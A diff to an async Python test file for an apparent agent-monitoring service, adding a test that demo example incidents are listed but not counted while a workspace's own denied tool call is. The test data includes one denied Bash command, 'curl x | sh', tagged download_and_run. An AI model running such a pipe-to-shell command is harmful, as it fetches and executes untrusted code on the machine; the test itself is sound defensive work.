@@ -65,6 +65,24 @@ async def test_the_feed_holds_the_four_kinds(client: httpx.AsyncClient) -> None:
                                     + feed["new"]["refused"])
 
 
+async def test_the_examples_incidents_are_not_the_workspaces_to_look_at(
+        client: httpx.AsyncClient) -> None:
+    """QA-440 / QA-466: the memory example or the tour lit the menu's
+    "Incidents 3" with the example's incidents. They are listed, labelled, and
+    not counted; the workspace's own are."""
+    await client.post("/v1/demo/seed-prod-incident")
+    await client.post("/v1/demo/seed-adapter-runs")
+    await client.post("/v1/demo/seed-memory")
+    feed = await _feed(client)
+    assert any(i["node_id"] == "support-agent-prod" and i["status"] == "new" for i in feed["items"])
+    assert feed["needs_a_look"] == 0
+    node = "coder-9"
+    await client.post(f"/v1/plane/{node}/telemetry", json={"run_id": f"{node}-t1", "events": [
+        _line(node, 0, "tool_call", "deny", tool="Bash", args={"command": "curl x | sh"},
+              reason="download_and_run")]})
+    assert (await _feed(client))["needs_a_look"] == 1
+
+
 async def test_the_operators_word_sticks_and_filters(client: httpx.AsyncClient) -> None:
     await client.post("/v1/demo/seed-prod-incident")
     drop = next(i for i in (await _feed(client, kind="dangerous"))["items"])
@@ -73,7 +91,8 @@ async def test_the_operators_word_sticks_and_filters(client: httpx.AsyncClient) 
     r = await client.put("/v1/incidents/status", json={"id": drop["id"], "status": "rule_made"})
     assert r.status_code == 200
     assert (await _feed(client, kind="dangerous"))["items"][0]["status"] == "rule_made"
-    assert (await _feed(client))["needs_a_look"] == before - 1
+    # an example's incident is not in the menu's count either way (QA-440)
+    assert (await _feed(client))["needs_a_look"] == before
     assert (await _feed(client, status="new", kind="dangerous"))["items"] == []
     bad = await client.put("/v1/incidents/status", json={"id": drop["id"], "status": "meh"})
     assert bad.status_code == 400
